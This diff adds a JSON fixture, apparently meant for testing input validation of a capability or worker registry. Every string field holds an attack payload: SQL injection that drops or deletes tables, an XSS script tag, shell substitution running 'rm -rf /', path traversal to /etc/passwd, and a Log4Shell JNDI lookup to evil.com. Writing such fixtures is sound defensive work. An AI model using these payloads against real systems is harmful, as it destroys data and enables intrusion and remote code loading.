@@ -1,0 +1,30 @@
+{
+    "id": "test.injection'; DROP TABLE capabilities; --",
+    "name": "<script>alert('XSS')</script>",
+    "version": {
+        "major": 1,
+        "minor": 0,
+        "patch": 0
+    },
+    "description": "'; DELETE FROM workers WHERE '1'='1",
+    "contract": {
+        "input_schema": {
+            "type": "object",
+            "properties": {
+                "query": {
+                    "type": "string",
+                    "description": "$(rm -rf /) && echo 'pwned'"
+                }
+            }
+        },
+        "output_schema": {
+            "type": "object"
+        },
+        "error_codes": [
+            {
+                "code": "../../etc/passwd",
+                "description": "${jndi:ldap://evil.com/a}"
+            }
+        ]
+    }
+}
